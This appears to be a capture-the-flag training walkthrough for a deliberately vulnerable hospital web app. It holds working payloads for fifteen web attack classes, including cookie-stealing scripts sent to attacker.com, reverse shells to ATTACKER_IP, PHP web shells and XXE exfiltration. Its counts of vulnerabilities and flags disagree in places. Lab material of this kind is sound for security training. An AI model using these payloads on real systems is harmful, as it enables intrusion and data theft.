# 04 - Complete Exploitation Walkthrough
## Step-by-Step Guide for All Vulnerabilities

Copyright (c) 2026 MOJ for Sheflabs. All rights reserved.

---

## Table of Contents

1. [SQL Injection](#1-sql-injection)
2. [Cross-Site Scripting (XSS)](#2-cross-site-scripting-xss)
3. [Insecure Direct Object Reference (IDOR)](#3-insecure-direct-object-reference-idor)
4. [Mass Assignment](#4-mass-assignment)
5. [Directory Traversal](#5-directory-traversal)
6. [Command Injection](#6-command-injection)
7. [File Upload RCE](#7-file-upload-rce)
8. [Server-Side Request Forgery (SSRF)](#8-server-side-request-forgery-ssrf)
9. [Business Logic Flaws](#9-business-logic-flaws)
10. [API Security (BOLA)](#10-api-security-bola)
11. [Race Conditions](#11-race-conditions)
12. [Insecure Deserialization](#12-insecure-deserialization)
13. [Server-Side Template Injection (SSTI)](#13-server-side-template-injection-ssti)
14. [JWT Attacks](#14-jwt-attacks)
15. [XML External Entity (XXE)](#15-xml-external-entity-xxe)

---

## Important Note: Difficulty Levels

**This walkthrough focuses on LOW DIFFICULTY exploitation.**

All examples assume you have set the difficulty level to **Low** in the application. This means:
- All protections are disabled
- No WAF blocking
- Detailed error messages
- Exploitation hints visible
- Perfect for learning

**For Other Difficulty Levels:**
- **Medium:** Requires encoding/bypass techniques (covered briefly in each section)
- **Hard:** Requires advanced bypasses and WAF evasion (see separate guide)
- **Impossible:** Nearly unbreakable, requires expert techniques (reference implementation)

For detailed difficulty-specific exploitation techniques, see:
- **runbook/05-MITM-ATTACKS-GUIDE.md** - For intercepting and modifying traffic
- **runbook/06-WAF-BYPASS-TECHNIQUES.md** - For Medium/Hard/Impossible levels

---

## Prerequisites

### Required Tools:
- Burp Suite Community/Professional
- Web browser (Chrome/Firefox with DevTools)
- SQLMap
- curl/wget
- Text editor
- Python 3.x (for scripts)

### Required Knowledge:
- Basic HTTP protocol understanding
- SQL syntax basics
- HTML/JavaScript basics
- Command line proficiency

### Environment Setup:
```bash
# Access application
URL: http://localhost/Medview/vulnerable/

# Default credentials
Username: ali@sheflabs.com
Password: Password123

# IMPORTANT: Set difficulty to Low for this walkthrough
# Login → Dashboard → Settings → Difficulty: Low
```

---

## 1. SQL Injection

### Difficulty: Low

### Target File: `user-login-sqli.php`

### Overview:
SQL injection allows you to manipulate database queries by injecting malicious SQL code through input fields.

### Step-by-Step Exploitation:

#### Step 1: Identify the Vulnerability
```
1. Navigate to: http://localhost/Medview/vulnerable/user-login-sqli.php
2. Notice the login form with username and password fields
3. View page source - look for hints in HTML comments
```

#### Step 2: Test for SQL Injection
```
Username: admin'
Password: anything
Click Login

Expected: SQL error message displayed (information disclosure)
Error reveals: SQL query structure
```

#### Step 3: Basic Authentication Bypass
```
Username: admin' OR '1'='1' --
Password: anything

Explanation:
- admin' closes the username string
- OR '1'='1' adds a condition that's always true
- -- comments out the rest of the query (password check)

Resulting Query:
SELECT * FROM users WHERE email='admin' OR '1'='1' --' AND password='anything'
```

#### Step 4: Alternative Payloads
```
Try these variations:

1. Using #:
   Username: admin' OR '1'='1' #
   Password: anything

2. Using /*:
   Username: admin' OR '1'='1' /*
   Password: anything

3. Boolean-based:
   Username: admin' OR 1=1 --
   Password: anything

4. Union-based (if error messages disabled):
   Username: admin' UNION SELECT NULL,NULL,NULL --
   Password: anything
```

#### Step 5: Extract Data (Advanced)
```
Username: admin' UNION SELECT 1,email,password,4,5,6,7,8 FROM users --
Password: anything

This dumps all usernames and passwords from the database.
```

#### Step 6: Using SQLMap (Automated)
```bash
# Save request to file
cat > request.txt << EOF
POST /Medview/vulnerable/user-login-sqli.php HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded

username=admin&password=test&submit=Login
EOF

# Run SQLMap
sqlmap -r request.txt --batch --dump

# Target specific parameter
sqlmap -u "http://localhost/Medview/vulnerable/user-login-sqli.php" \
       --data="username=admin&password=test&submit=Login" \
       -p username --dump
```

#### Step 7: Capture the Flag
```
Successfully logging in with SQL injection will:
1. Redirect to dashboard
2. Display notification: "VULNERABILITY EXPLOITED!"
3. Award flag: FLAG{SQL_1nj3ct10n_M4st3r_2025}
4. Credit account: +500 NGN
```

### Success Indicators:
- Logged in without valid credentials
- Flag captured
- Balance increased by 500 NGN
- Exploit logged in database

---

## 2. Cross-Site Scripting (XSS)

### Difficulty: Low (Reflected), Medium (Stored)

### Target Files: `search-xss.php`, `profile-vulnerable.php`

### Reflected XSS Exploitation:

#### Step 1: Access Search Page
```
Navigate to: http://localhost/Medview/vulnerable/search-xss.php
```

#### Step 2: Test for XSS
```
Search Term: <script>alert('XSS')</script>
Submit

Expected: Alert box appears
```

#### Step 3: Advanced Payloads
```
1. Cookie Stealing:
   <script>document.location='http://attacker.com/steal.php?c='+document.cookie</script>

2. DOM Manipulation:
   <script>document.body.innerHTML='<h1>Hacked!</h1>'</script>

3. Keylogger:
   <script>document.onkeypress=function(e){fetch('http://attacker.com/log?k='+e.key)}</script>

4. Bypass Filters (if any):
   <img src=x onerror=alert('XSS')>
   <svg onload=alert('XSS')>
   <body onload=alert('XSS')>
```

### Stored XSS Exploitation:

#### Step 1: Login and Access Profile
```
1. Login with: ali@sheflabs.com / Password123
2. Navigate to profile page
```

#### Step 2: Inject Malicious Script
```
In Full Name field:
<script>alert('Stored XSS')</script>

In Address field:
<img src=x onerror=alert(document.cookie)>

Submit and refresh page
Expected: Script executes every time page loads
```

#### Step 3: Persistent Payload
```
Create persistent XSS that affects all users viewing your profile:

Full Name: 
<script>
fetch('http://attacker.com/steal.php?cookie='+document.cookie);
</script>
```

### Success Indicators:
- Alert box displayed
- Flag captured: FLAG{XSS_R3fl3ct3d_H4ck3r} or FLAG{XSS_St0r3d_P3rs1st3nt}
- +500 NGN credit

---

## 3. Insecure Direct Object Reference (IDOR)

### Difficulty: Low

### Target File: `appointment-history-vulnerable.php`

### Step-by-Step Exploitation:

#### Step 1: View Your Appointments
```
1. Login as: ali@sheflabs.com / Password123
2. Navigate to appointment history
3. Note the URL: appointment-history-vulnerable.php?user_id=1
```

#### Step 2: Enumerate Other Users
```
Try different user IDs:

URL: appointment-history-vulnerable.php?user_id=2
URL: appointment-history-vulnerable.php?user_id=3
URL: appointment-history-vulnerable.php?user_id=4

Expected: View other users' appointments
```

#### Step 3: Automated Enumeration
```bash
# Using curl
for i in {1..10}; do
  curl "http://localhost/Medview/vulnerable/appointment-history-vulnerable.php?user_id=$i" \
  --cookie "PHPSESSID=your_session_here"
done

# Using Burp Intruder
1. Send request to Intruder
2. Mark user_id parameter as payload position
3. Set payload type: Numbers (1-100)
4. Start attack
5. Analyze responses for different users' data
```

#### Step 4: Extract Sensitive Information
```
Accessed data includes:
- Patient names
- Doctor appointments
- Medical conditions
- Appointment dates/times
- Personal information
```

### Success Indicators:
- Viewing other users' data
- Flag captured: FLAG{1D0R_Br0k3n_4cc3ss}
- +500 NGN credit

---

## 4. Mass Assignment

### Difficulty: Medium

### Target File: `mass-assignment-vulnerable.php`

### Step-by-Step Exploitation:

#### Step 1: Understand the Vulnerability
```
Mass assignment occurs when user input directly updates database fields
without proper filtering. You can assign values to fields that shouldn't
be user-controllable.
```

#### Step 2: Intercept Payment Request
```
1. Login and navigate to payment page
2. Open Burp Suite or browser DevTools
3. Initiate a payment
4. Intercept the POST request
```

#### Step 3: Modify Hidden Parameters
```
Original Request:
POST /Medview/vulnerable/mass-assignment-vulnerable.php
Content-Type: application/x-www-form-urlencoded

amount=100&item_id=1&submit=Pay

Modified Request (add is_premium parameter):
POST /Medview/vulnerable/mass-assignment-vulnerable.php
Content-Type: application/x-www-form-urlencoded

amount=100&item_id=1&is_premium=1&discount=100&submit=Pay
```

#### Step 4: Exploit Further
```
Try assigning:

1. Admin privileges:
   &is_admin=1&role=admin

2. Balance manipulation:
   &balance=999999

3. Free items:
   &price=0&discount=100

4. Privilege escalation:
   &user_type=administrator
```

#### Step 5: Using Burp Repeater
```
1. Send request to Repeater
2. Add parameters one by one
3. Test each modification
4. Observe response for success
```

### Success Indicators:
- Assigned values you shouldn't control
- Flag captured: FLAG{M4ss_4ss1gn_Pr1v_3sc}
- +500 NGN credit

---

## 5. Directory Traversal

### Difficulty: Medium

### Target File: `view-file.php`

### Step-by-Step Exploitation:

#### Step 1: Identify File Parameter
```
URL: http://localhost/Medview/vulnerable/view-file.php?file=report.pdf
```

#### Step 2: Basic Traversal
```
Try accessing /etc/passwd:

URL: view-file.php?file=../../../../../../../etc/passwd

Expected: System password file displayed
```

#### Step 3: Common Target Files
```
Linux:
- file=../../../../../../../etc/passwd
- file=../../../../../../../etc/shadow (if permissions allow)
- file=../../../../../../../etc/hosts
- file=../../../../../../../var/log/apache2/access.log

Windows:
- file=..\..\..\..\..\windows\system32\drivers\etc\hosts
- file=..\..\..\..\..\windows\win.ini
- file=..\..\..\..\..\boot.ini
```

#### Step 4: Read Application Files
```
Access application configuration:

file=../../config-vulnerable.php
file=../../.env
file=../../index.php
```

#### Step 5: Bypass Filters
```
If basic traversal is blocked, try:

1. URL encoding:
   file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

2. Double encoding:
   file=%252e%252e%252f%252e%252e%252f

3. Null byte injection (PHP < 5.3):
   file=../../../etc/passwd%00.pdf

4. Unicode encoding:
   file=..%c0%af..%c0%af..%c0%afetc/passwd
```

### Success Indicators:
- Reading arbitrary system files
- Flag captured: FLAG{D1r_Tr4v3rs4l_F1l3_R34d}
- +500 NGN credit

---

## 6. Command Injection

### Difficulty: Hard

### Target File: `command-injection.php`

### Step-by-Step Exploitation:

#### Step 1: Identify Injectable Parameter
```
Page allows ping functionality:
Input: 127.0.0.1
Command executed: ping -c 4 127.0.0.1
```

#### Step 2: Test for Command Injection
```
Input: 127.0.0.1; whoami

Expected: Ping output + current user name
```

#### Step 3: Command Chaining Techniques
```
1. Semicolon:
   127.0.0.1; ls -la

2. Pipe:
   127.0.0.1 | cat /etc/passwd

3. AND operator:
   127.0.0.1 && id

4. OR operator:
   127.0.0.1 || whoami

5. Backticks:
   127.0.0.1`whoami`

6. Command substitution:
   127.0.0.1$(whoami)
```

#### Step 4: Read Sensitive Files
```
Input: 127.0.0.1; cat /etc/passwd
Input: 127.0.0.1; cat config-vulnerable.php
Input: 127.0.0.1; ls -la /var/www/html
```

#### Step 5: Reverse Shell (Advanced)
```
1. Set up listener on attacker machine:
   nc -lvp 4444

2. Inject reverse shell:
   127.0.0.1; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

3. Python reverse shell:
   127.0.0.1; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

4. Netcat reverse shell:
   127.0.0.1; nc ATTACKER_IP 4444 -e /bin/bash
```

#### Step 6: Bypass Filters
```
If certain characters are filtered:

1. Using $IFS instead of spaces:
   127.0.0.1;cat$IFS/etc/passwd

2. Base64 encoding:
   127.0.0.1;echo$IFS'Y2F0IC9ldGMvcGFzc3dk'|base64$IFS-d|bash

3. Hex encoding:
   127.0.0.1;$(echo -e "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")
```

### Success Indicators:
- Arbitrary command execution
- Flag captured: FLAG{CMD_1nj3ct_RC3_G0d}
- +500 NGN credit

---

## 7. File Upload RCE

### Difficulty: Hard

### Target File: `file-upload.php`

### Step-by-Step Exploitation:

#### Step 1: Understand Upload Functionality
```
Navigate to file upload page
Test uploading a legitimate image first
```

#### Step 2: Create PHP Web Shell
```php
Create shell.php:

<?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>

Or more advanced:

<?php
echo "<pre>";
$cmd = ($_REQUEST['cmd']);
system($cmd);
echo "</pre>";
?>
```

#### Step 3: Bypass File Type Restrictions
```
1. Double extension:
   shell.php.jpg

2. Null byte (PHP < 5.3):
   shell.php%00.jpg

3. Case variation:
   shell.PhP
   shell.pHp

4. Alternative extensions:
   shell.php3
   shell.php4
   shell.php5
   shell.phtml
   shell.phar
```

#### Step 4: Bypass Content-Type Validation
```
In Burp Suite, modify request:

POST /Medview/vulnerable/file-upload.php
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg    <-- Change to image type

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

#### Step 5: Access Uploaded Shell
```
1. Note the upload path from response
2. Access: http://localhost/Medview/uploads/shell.php?cmd=whoami
3. Execute commands:
   ?cmd=ls -la
   ?cmd=cat /etc/passwd
   ?cmd=pwd
```

#### Step 6: Upgrade to Full Shell
```
Using the web shell to download full reverse shell:

?cmd=wget http://attacker.com/fullshell.php
?cmd=curl http://attacker.com/fullshell.php -o fullshell.php

Then access: http://localhost/Medview/uploads/fullshell.php
```

### Success Indicators:
- PHP shell uploaded and accessible
- Remote code execution achieved
- Flag captured: FLAG{F1l3_Upl04d_W3b5h3ll}
- +500 NGN credit

---

## 8. Server-Side Request Forgery (SSRF)

### Difficulty: Hard

### Target File: `ssrf-vulnerable.php`

### Step-by-Step Exploitation:

#### Step 1: Identify SSRF Vulnerability
```
Page allows fetching external URLs:
Input: http://example.com
Expected: Page content displayed
```

#### Step 2: Internal Network Scanning
```
Test internal IPs:

URL: http://127.0.0.1
URL: http://localhost
URL: http://192.168.1.1
URL: http://10.0.0.1
```

#### Step 3: Port Scanning
```
Scan internal ports:

http://127.0.0.1:22    (SSH)
http://127.0.0.1:3306  (MySQL)
http://127.0.0.1:6379  (Redis)
http://127.0.0.1:9200  (Elasticsearch)
```

#### Step 4: Access Cloud Metadata (AWS)
```
AWS metadata endpoint:
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

Azure metadata:
http://169.254.169.254/metadata/instance?api-version=2021-02-01

Google Cloud:
http://metadata.google.internal/computeMetadata/v1/
```

#### Step 5: Read Local Files
```
Using file:// protocol:

URL: file:///etc/passwd
URL: file:///var/www/html/config-vulnerable.php
URL: file:///etc/hosts
```

#### Step 6: Bypass Filters
```
If blacklists exist:

1. Alternative IP representations:
   http://2130706433/           (decimal)
   http://0x7f000001/           (hex)
   http://0177.0.0.1/           (octal)
   http://[::1]/                (IPv6)

2. DNS rebinding:
   http://attacker-controlled-dns.com

3. Shortened URLs:
   http://bit.ly/internal-redirect

4. URL encoding:
   http://127.0.0.1 → http://127.0.0.%31
```

### Success Indicators:
- Accessing internal services
- Reading cloud metadata
- Flag captured: FLAG{SSRF_1nt3rn4l_N3tw0rk}
- +500 NGN credit

---

## 9. Business Logic Flaws

### Difficulty: Medium

### Target Files: `cashout-crypto.php`, `business-logic-race.php`

### Negative Pricing Exploitation:

#### Step 1: Intercept Purchase Request
```
1. Navigate to medication purchase
2. Select item (e.g., Paracetamol - 50 NGN)
3. Intercept request in Burp Suite
```

#### Step 2: Modify Quantity to Negative
```
Original Request:
item_id=1&quantity=1&submit=Purchase

Modified Request:
item_id=1&quantity=-10&submit=Purchase

Result: Instead of deducting 500, your balance increases by 500
```

#### Step 3: Race Condition in Booking:

```
1. Open two browser tabs
2. Start appointment booking in both
3. Submit simultaneously
4. Observe: Double booking or payment charged once but two appointments created
```

#### Step 4: Cryptocurrency Rate Manipulation:

```
1. Initiate crypto purchase
2. Intercept request
3. Modify exchange rate parameter:
   
   rate=65000000 → rate=1

4. Buy Bitcoin for 1 NGN instead of 65M NGN
```

### Success Indicators:
- Negative balance manipulation
- Free items acquired
- Flag captured: FLAG{B1z_L0g1c_Fr4ud_M4st3r}
- +500 NGN credit

---

## 10. API Security (BOLA)

### Difficulty: Medium

### Target File: `api-vulnerable.php`

### Step-by-Step Exploitation:

#### Step 1: Discover API Endpoints
```
Common endpoints:
/api-vulnerable.php?action=getUser&id=1
/api-vulnerable.php?action=getAppointments&user_id=1
/api-vulnerable.php?action=getRecords&patient_id=1
```

#### Step 2: Test Object Level Authorization
```
1. Get your user ID from dashboard
2. API call: /api-vulnerable.php?action=getUser&id=1
3. Change id parameter: ?action=getUser&id=2
4. Expected: Access to other user's data
```

#### Step 3: Enumerate All Users
```bash
#!/bin/bash
# Enumerate all users via API
for i in {1..100}; do
  curl "http://localhost/Medview/vulnerable/api-vulnerable.php?action=getUser&id=$i" \
  --cookie "PHPSESSID=your_session"
done
```

#### Step 4: Modify Other Users' Data
```
POST /api-vulnerable.php?action=updateUser&id=2
Content-Type: application/json

{
  "fullname": "Hacked User",
  "email": "hacked@example.com"
}
```

#### Step 5: CORS Exploitation
```html
Create malicious page:

<script>
fetch('http://localhost/Medview/vulnerable/api-vulnerable.php?action=getUser&id=1', {
  credentials: 'include'
})
.then(r => r.json())
.then(data => {
  // Send stolen data to attacker
  fetch('http://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
</script>
```

### Success Indicators:
- Accessing unauthorized API resources
- Modifying other users' data
- Flag captured: FLAG{4P1_B0L4_D4t4_L34k}
- +500 NGN credit

---

## 11. Race Conditions

### Difficulty: Hard

### Target File: `business-logic-race.php`

### Step-by-Step Exploitation:

#### Step 1: Identify Race Condition Window
```
Operations vulnerable to race conditions:
- Balance withdrawal
- Appointment booking
- Item purchasing
- Coupon redemption
```

#### Step 2: Manual Race Condition
```
1. Open two browser tabs
2. Navigate to withdrawal page in both
3. Enter withdrawal amount (e.g., 500 NGN)
4. Click submit in both tabs simultaneously
5. Expected: Balance deducted once, withdrawal processed twice
```

#### Step 3: Automated Race Condition Tool
```python
# race_condition.py
import requests
import threading

url = "http://localhost/Medview/vulnerable/business-logic-race.php"
cookies = {"PHPSESSID": "your_session_here"}
data = {"amount": "500", "action": "withdraw"}

def make_request():
    r = requests.post(url, data=data, cookies=cookies)
    print(r.text)

# Create multiple threads
threads = []
for i in range(10):
    t = threading.Thread(target=make_request)
    threads.append(t)

# Start all threads simultaneously
for t in threads:
    t.start()

for t in threads:
    t.join()
```

#### Step 4: Using Burp Turbo Intruder
```
1. Send request to Turbo Intruder
2. Use this script:

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=10,
                          requestsPerConnection=1,
                          pipeline=False)
    
    for i in range(10):
        engine.queue(target.req)

3. Execute with maximum concurrency
```

### Success Indicators:
- Double-spending achieved
- Balance manipulation
- Flag captured: FLAG{R4c3_C0nd1t10n_T1m1ng}
- +500 NGN credit

---

## 12. Insecure Deserialization

### Difficulty: Expert (Impossible Level)

### Target File: `insecure-deserialization.php`

### Step-by-Step Exploitation:

#### Step 1: Understand PHP Serialization
```php
Serialized data format:
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:4:"user";}

O = Object
4 = Length of class name
"User" = Class name
2 = Number of properties
```

#### Step 2: Create Malicious Object
```php
<?php
class User {
    public $name = "admin";
    public $role = "administrator";
    
    function __destruct() {
        system("whoami");
    }
}

$obj = new User();
echo serialize($obj);
?>

Output:
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:13:"administrator";}
```

#### Step 3: Inject Serialized Payload
```
Find parameter accepting serialized data:
cookie: user_data=

Replace with malicious payload:
cookie: user_data=O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:13:"administrator";}
```

#### Step 4: Advanced RCE via Magic Methods
```php
<?php
class Exploit {
    public $cmd = "cat /etc/passwd";
    
    function __wakeup() {
        system($this->cmd);
    }
}

echo serialize(new Exploit());
?>
```

### Success Indicators:
- Code execution via deserialization
- Flag captured: FLAG{D3s3r14l1z3_RC3_M4g1c}
- +500 NGN credit

---

## 13. Server-Side Template Injection (SSTI)

### Difficulty: Expert (Impossible Level)

### Target File: `advanced-exploits.php`

### Step-by-Step Exploitation:

#### Step 1: Identify Template Engine
```
Test payloads to identify engine:

{{7*7}}          = 49 (Twig/Jinja)
${7*7}           = 49 (FreeMarker)
<%= 7*7 %>       = 49 (ERB)
${{7*7}}         = 49 (PHP)
```

#### Step 2: Basic SSTI Test
```
Input: {{7*7}}
Expected Output: 49

If output is 49, SSTI confirmed
```

#### Step 3: Template-Specific Exploitation

**For Twig (PHP):**
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("cat /etc/passwd")}}
```

**For Jinja2 (Python):**
```
{{config.items()}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()}}
```

#### Step 4: RCE via SSTI
```
Payload for PHP:
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1")}}
```

### Success Indicators:
- Template injection confirmed
- Remote code execution
- Flag captured: FLAG{SSTI_T3mpl4t3_RC3}
- +500 NGN credit

---

## 14. JWT Attacks

### Difficulty: Hard

### Target File: `advanced-exploits.php`

### Step-by-Step Exploitation:

#### Step 1: Capture JWT Token
```
1. Login to application
2. Open browser DevTools → Application → Cookies
3. Find JWT token (usually in Authorization header or cookie)

Format: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature
```

#### Step 2: Decode JWT
```
Use jwt.io or command line:

echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d

Result:
{"alg":"HS256","typ":"JWT"}
{"user":"admin","role":"user"}
```

#### Step 3: None Algorithm Attack
```
1. Change algorithm to "none":
{"alg":"none","typ":"JWT"}

2. Modify payload:
{"user":"admin","role":"administrator"}

3. Base64 encode and remove signature:
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW5pc3RyYXRvciJ9.

Note: Empty signature section
```

#### Step 4: Weak Secret Brute Force
```bash
# Using jwt-cracker
git clone https://github.com/lmammino/jwt-cracker
cd jwt-cracker
node index.js <JWT_TOKEN> <ALPHABET> <MAX_LENGTH>

# Using hashcat
hashcat -m 16500 jwt.txt wordlist.txt

# Common weak secrets to try:
- secret
- secret123
- password
- jwt_secret
```

#### Step 5: Key Confusion Attack
```
If app uses RS256 but accepts HS256:

1. Get public key from /jwks.json or /.well-known/jwks.json
2. Use public key as HS256 secret
3. Sign new token with HS256 using public key
```

### Success Indicators:
- JWT token forged successfully
- Privilege escalation achieved
- Flag captured: FLAG{JWT_N0n3_4lg_Byp4ss}
- +500 NGN credit

---

## 15. XML External Entity (XXE)

### Difficulty: Hard

### Target File: `ssrf-vulnerable.php` (XML parsing endpoint)

### Step-by-Step Exploitation:

#### Step 1: Identify XML Parser
```
Find endpoint accepting XML input
POST /api-vulnerable.php
Content-Type: application/xml

<user><name>test</name></user>
```

#### Step 2: Basic XXE Test
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
</user>
```

#### Step 3: Read Sensitive Files
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///var/www/html/config-vulnerable.php">
]>
<user>
  <name>&xxe;</name>
</user>
```

#### Step 4: Out-of-Band XXE (Blind)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
%xxe;
]>
<user><name>test</name></user>

evil.dtd content:
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfil;
```

#### Step 5: SSRF via XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://localhost:3306">
]>
<user>
  <name>&xxe;</name>
</user>
```

### Success Indicators:
- Reading local files via XXE
- SSRF achieved
- Flag captured: FLAG{XXE_F1l3_R34d_XML}
- +500 NGN credit

---

## Summary & Tips

### Exploitation Checklist

**For Each Vulnerability:**
- [ ] Read the vulnerability description
- [ ] Understand the attack vector
- [ ] Follow steps in order
- [ ] Test each payload
- [ ] Capture the flag
- [ ] Document findings

### Common Tools Command Reference

**Burp Suite:**
```
1. Proxy → Intercept → Intercept is on
2. Send to Repeater (Ctrl+R)
3. Send to Intruder (Ctrl+I)
4. Forward request (Ctrl+F)
```

**SQLMap:**
```bash
# Basic usage
sqlmap -u "URL" --batch --dump

# With request file
sqlmap -r request.txt --batch

# Target specific database
sqlmap -u "URL" -D database_name --dump
```

**curl:**
```bash
# GET request
curl "http://localhost/Medview/vulnerable/page.php?id=1"

# POST request
curl -X POST "http://localhost/Medview/vulnerable/page.php" \
     -d "param1=value1&param2=value2"

# With cookies
curl "URL" --cookie "PHPSESSID=session_id"
```

### Progression Path

**Week 1: Basic Vulnerabilities (Low Difficulty)**
1. SQL Injection
2. XSS (Reflected & Stored)
3. IDOR
4. Open Redirect

**Week 2: Intermediate (Medium Difficulty)**
5. Mass Assignment
6. Directory Traversal
7. Business Logic Flaws
8. API Security (BOLA)

**Week 3: Advanced (Hard Difficulty)**
9. Command Injection
10. File Upload RCE
11. SSRF
12. Race Conditions

**Week 4: Expert (Impossible Difficulty)**
13. Insecure Deserialization
14. SSTI
15. JWT Attacks
16. XXE

### Flag Capture Rewards

Each successful exploit earns:
- **Reward:** 500 NGN
- **Flag:** Unique flag code
- **Recognition:** Logged in exploit tracking

**Total Possible Earnings:**
20 flags × 500 NGN = 10,000 NGN

### Best Practices

**During Testing:**
1. Always test on Low difficulty first
2. Take notes of successful payloads
3. Understand WHY the exploit works
4. Try multiple variations
5. Document your methodology

**After Exploitation:**
1. Review the vulnerable code
2. Understand the security flaw
3. Learn the proper fix (see remediation guide)
4. Practice on higher difficulty levels
5. Share knowledge with others

### Difficulty Progression

**Low → Medium:**
- Basic protections added
- Need encoding/bypass
- Filters can be evaded
- Requires more creativity

**Medium → Hard:**
- Strong validation present
- WAF active
- Advanced bypass needed
- Multiple layers of protection

**Hard → Impossible:**
- Production-level security
- Nearly unbreakable
- Teaches secure coding
- Reference implementation

### Additional Resources

**Practice Platforms:**
- OWASP WebGoat
- PortSwigger Web Security Academy
- HackTheBox
- TryHackMe

**Learning Resources:**
- OWASP Testing Guide
- PortSwigger Blog
- Bug Bounty write-ups
- Security research papers

### Troubleshooting

**If Exploit Doesn't Work:**
1. Check difficulty level (should be Low for learning)
2. Verify payload syntax
3. Check for typos in commands
4. Review browser console for errors
5. Try alternative payloads
6. Consult the hints in source code

**If Flag Not Captured:**
1. Verify you're logged in
2. Check balance wasn't already credited
3. Try refreshing the page
4. Check exploit tracking table
5. Report bug if persistent issue

---

## Conclusion

This walkthrough provides comprehensive, step-by-step instructions for exploiting all vulnerabilities in the Medview+ Vulnerable HMS. Each section includes:

- Clear explanations
- Multiple payload examples
- Tool usage instructions
- Success indicators
- Flag capture confirmation

**Remember:**
- This is for AUTHORIZED TRAINING ONLY
- Never use these techniques on production systems
- Always obtain proper permission
- Use knowledge for defense, not attack

**Good luck with your security training!**

---

**Last Updated:** 2026-01-01  
**Version:** 1.0  
**Total Vulnerabilities Covered:** 15+  
**Estimated Completion Time:** 40+ hours

Copyright (c) 2026 MOJ for Sheflabs. All rights reserved.
